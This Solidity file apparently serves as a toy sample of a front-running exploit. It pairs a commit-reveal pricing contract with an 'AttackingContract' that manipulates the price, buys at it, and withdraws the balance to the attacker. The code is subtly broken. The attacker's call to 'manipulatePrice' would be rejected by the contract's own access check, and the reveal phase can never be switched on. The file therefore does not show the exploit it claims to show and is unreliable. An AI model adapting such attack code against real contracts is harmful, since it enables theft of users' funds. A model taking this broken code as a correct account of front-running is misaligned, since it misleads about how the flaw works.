// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.19;

contract FrontRunningContract {
    uint256 public startingPrice;
    mapping(address => bytes32) public pricingAgreements; //store commitment hashes
    bool public revealPhase; //is reveal phrase active?

    event PriceCommitted(address committer, bytes32 commitHash); //when price committed, emit
    event PriceRevealed(address revealer, uint256 price); //when price revealed, emit
    event Purchase(address buyer, uint256 amount); //whe purchase made, emit

    modifier onlyManipulator() {
        require(msg.sender == address(this), "Only the original contract can manipulate price");
        _;
    }

    function commitPrice(bytes32 _commitHash) external {
        require(!revealPhase, "Cannot commit during reveal phase");
        pricingAgreements[msg.sender] = _commitHash; //store commitment hash for owner
        emit PriceCommitted(msg.sender, _commitHash); //emit the price committed
    }

    function revealPrice(uint256 _price, bytes32 _secret) external {
        require(revealPhase, "Cannot reveal outside reveal phase");
        bytes32 commitment = pricingAgreements[msg.sender]; //retrieve the has for owner
        require(commitment != bytes32(0), "No price committed by this address");
        require(keccak256(abi.encodePacked(_price, _secret)) == commitment, "Hash mismatch");
        startingPrice = _price; //setting the start price to the revealed one
        revealPhase = false; //turn off reveal phrase
        emit PriceRevealed(msg.sender, _price); //emit the revelaed price
    }

    function manipulatePrice(uint256 _newPrice) external onlyManipulator {
        require(!revealPhase, "Cannot manipulate during reveal phase");
        startingPrice = _newPrice; //setting the starting price to the new price
    }

    function purchase() external payable {
        require(msg.value == startingPrice, "Must send the committed price");
        emit Purchase(msg.sender, msg.value); //emit when purchase made
    }
}

contract AttackingContract {
    
FrontRunningContract public frontRunningContract;
    address public exploiter;
    event Exploitation(uint256 priceSent); //triggered if exploit detected

    constructor(address _priceManipulationContract) {
        frontRunningContract = FrontRunningContract(_priceManipulationContract); //Initialising the vulnerable contract variable with corresponding address
        exploiter = msg.sender; //set exploiter as contract owner
    }

    function exploit(uint256 _price) external payable { //payable to take Ether
        emit Exploitation(_price); //emit exploitation with price provided 
        frontRunningContract.manipulatePrice(_price + 1); //price manipulation
        frontRunningContract.purchase{value: _price + 1}(); //purchase with manipulated price
    }

    function withdraw() external {
        require(msg.sender == exploiter, "Only the exploiter can withdraw");
        payable(exploiter).transfer(address(this).balance); //transfer contract balance to attacker
    }
}